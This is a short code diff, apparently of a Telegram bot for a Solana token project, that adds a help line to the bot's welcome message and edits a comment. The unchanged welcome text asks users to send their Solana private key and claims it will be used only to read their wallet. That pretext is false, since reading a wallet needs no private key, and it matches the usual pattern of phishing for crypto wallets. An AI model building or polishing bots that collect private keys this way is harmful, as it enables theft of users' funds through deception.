@@ -55,7 +55,9 @@ To continue, please send your Solana *private key* (in base58 format or JSON arr
 
 ⚠️ Your key will be used to read your wallet only. Keep it safe.
 
-🌐 Visit our website: [magetoken.com.br](https://magetoken.com.br)`,
+🌐 Visit our website: [magetoken.com.br](https://magetoken.com.br)
+
+❓ *Need help?* Type /help to see all available commands.`,
       parse_mode: 'Markdown'
     }
   );
@@ -156,7 +158,7 @@ bot.on('text', async (ctx) => {
       projectBalance = '0.5';
     }
 
-    ctx.session ??= {}; // ✅ Garante que a sessão exista
+    ctx.session ??= {}; // Garante que a sessão existe
     ctx.session.walletData = { pubkey, solBalance, projectBalance, refCount, canClaim };
 
     await ctx.replyWithMarkdown(formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim));
